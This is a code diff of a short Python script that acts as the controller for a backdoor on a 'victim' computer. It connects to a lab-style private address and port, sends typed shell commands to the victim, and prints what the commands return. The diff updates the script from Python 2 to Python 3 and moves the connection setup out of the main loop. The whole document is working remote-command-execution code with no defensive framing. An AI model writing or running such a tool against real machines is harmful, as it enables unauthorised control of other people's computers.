@@ -5,19 +5,19 @@ import socket
 HOST = "192.168.56.105"
 PORT = 65432
 
+#Connects to the victim computer
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
 #Prints victim data
 print("--- connected to victim at " + str(HOST) + "/" + str(PORT) + " ---\n")
 
 #Main loop
 while True:
-  #Connects to the victim computer
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect((HOST, PORT))
-  
   #Takes as input a command, and sends it to the open port on the victim computer
-  command = raw_input("victim terminal ~ $:")
+  command = input("victim terminal ~ $:").encode()
   s.sendall(command)
-  
+
   #Receives the output of the command being executed on the victim computer and prints it
-  result = s.recv(1024)
+  result = s.recv(1024).decode()
   print("\n" + result)
